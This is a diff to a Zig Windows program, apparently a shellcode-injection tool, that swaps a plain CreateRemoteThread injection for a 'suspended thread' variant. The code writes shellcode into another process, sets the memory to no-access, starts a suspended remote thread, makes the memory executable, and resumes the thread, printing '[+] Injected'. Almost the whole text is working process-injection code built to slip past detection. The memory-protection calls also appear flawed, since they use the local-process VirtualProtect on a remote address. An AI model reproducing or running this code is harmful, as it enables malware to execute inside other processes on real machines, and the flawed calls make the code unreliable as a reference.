@@ -32,6 +32,8 @@ extern "kernel32" fn OpenProcess(dwDesiredAccess: DWORD, bInheritHandle: BOOL, d
 extern "kernel32" fn VirtualAllocEx(hProcess: HANDLE, lpAddress: ?LPVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD) callconv(WINAPI) LPVOID;
 extern "kernel32" fn WriteProcessMemory(hProcess: HANDLE, lpBaseAddress: LPVOID, lpBuffer: LPCVOID, nSize: SIZE_T, lpNumberOfBytesWritten: *SIZE_T) callconv(WINAPI) BOOL;
 extern "kernel32" fn CreateRemoteThread(hProcess: HANDLE, lpThreadAttributes: ?LPSECURITY_ATTRIBUTES, dwStackSize: SIZE_T, lpStartAddress: LPTHREAD_START_ROUTINE, lpParameter: ?LPVOID, dwCreationFlags: DWORD, lpThreadId: ?LPDWORD) callconv(WINAPI) HANDLE;
+extern "kernel32" fn VirtualProtect(lpAddress: LPVOID, dwSize: SIZE_T, flNewProtect: DWORD, lpflOldProtect: *DWORD) callconv(WINAPI) BOOL;
+extern "kernel32" fn ResumeThread(hThread: HANDLE) callconv(WINAPI) DWORD;
 
 pub fn main() void {
     // Display a message indicating x64 process execution
@@ -48,12 +50,14 @@ pub fn main() void {
     }
 
     // Inject shellcode using CreateRemoteThread
-    injectCreateRemoteThread(u8, shellcodeX64[0..]);
+    suspendedThreadInjection(u8, shellcodeX64[0..]);
 }
 
 // Function to inject shellcode using CreateRemoteThread
-fn injectCreateRemoteThread(comptime T: type, shellcode: []const T) void {
+fn suspendedThreadInjection(comptime T: type, shellcode: []const T) void {
     const stdOut = std.io.getStdOut().writer();
+
+    var op: DWORD = undefined;
 
     // Allocate space for the application name in UTF-16
     var allocator = std.heap.page_allocator;
@@ -81,9 +85,21 @@ fn injectCreateRemoteThread(comptime T: type, shellcode: []const T) void {
     stdOut.print("[*] WriteProcessMemory: {any}\n", .{wSuccess}) catch undefined;
     stdOut.print("    \\-- bytes written: {any}\n", .{bytesWritten}) catch undefined;
 
-    // Create a remote thread to execute the shellcode
-    const tHandle = CreateRemoteThread(pHandle, null, 0, @ptrCast(rPtr), null, 0, null);
+    // Change the memory protection of the shellcode region to PAGE_NOACCESS.
+    // This effectively marks the memory as inaccessible, preventing execution.
+    _ = VirtualProtect(@ptrCast(rPtr), shellcode.len, win.PAGE_NOACCESS, &op);
+
+    // Create a remote thread in the target process to execute the shellcode.
+    // The thread is created in a suspended state using the CREATE_SUSPENDED flag.
+    const tHandle = CreateRemoteThread(pHandle, null, 0, @ptrCast(rPtr), null, CREATE_SUSPENDED, null);
     defer _ = kernel32.CloseHandle(tHandle);
+
+    // Change the memory protection of the shellcode region to PAGE_EXECUTE_READWRITE.
+    // This allows the memory to be both readable and writable, as well as executable.
+    _ = VirtualProtect(@ptrCast(rPtr), shellcode.len, win.PAGE_EXECUTE_READWRITE, &op);
+
+    // Resume the suspended thread, allowing shellcode execution
+    _ = ResumeThread(tHandle);
 
     stdOut.print("[*] tHandle: {any}\n", .{@intFromPtr(tHandle)}) catch undefined;
     stdOut.print("[+] Injected\n", .{}) catch undefined;
